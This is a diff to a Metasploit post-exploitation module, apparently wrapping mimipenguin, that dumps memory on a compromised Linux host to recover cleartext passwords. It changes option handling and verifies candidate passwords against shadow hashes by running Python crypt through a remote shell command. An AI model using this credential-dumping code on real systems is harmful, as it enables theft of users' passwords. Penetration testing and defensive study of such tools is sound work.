@@ -46,8 +46,10 @@ class MetasploitModule < Msf::Post
       'SessionTypes'  => ['shell', 'meterpreter'],
       'References'    => [['URL', 'https://github.com/huntergregal/mimipenguin']]))
     register_options [
-      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
-      OptInt.new('TIMEOUT', [ true, 'Timeout for dumping each memory region (seconds)', '60' ])
+      OptInt.new('TIMEOUT', [ true, 'Timeout for dumping each memory region (seconds)', '180' ])
+    ]
+    register_advanced_options [
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
     ]
   end
 
@@ -137,7 +139,9 @@ class MetasploitModule < Msf::Post
       hash = h[:hash]
       type = hash.split('$')[1]
       salt = hash.split('$')[2]
-      if password.crypt("$#{type}$#{salt}").to_s.eql? hash
+      python_code = "import crypt; import base64; print crypt.crypt(base64.b64decode('#{Rex::Text.encode_base64(password)}'), base64.b64decode('#{Rex::Text.encode_base64("$#{type}$#{salt}")}'))"
+      crypt = cmd_exec("python -c \"#{python_code}\"").to_s.strip
+      if crypt == hash
         users << h[:user]
       end
     end
@@ -182,7 +186,7 @@ class MetasploitModule < Msf::Post
       fail_with Failure::BadConfig, "#{base_dir} is not writable"
     end
 
-    %w[strings grep].each do |cmd|
+    %w[strings grep python].each do |cmd|
       unless command_exists? cmd
         fail_with Failure::NotVulnerable, "#{cmd} is required but not installed"
       end
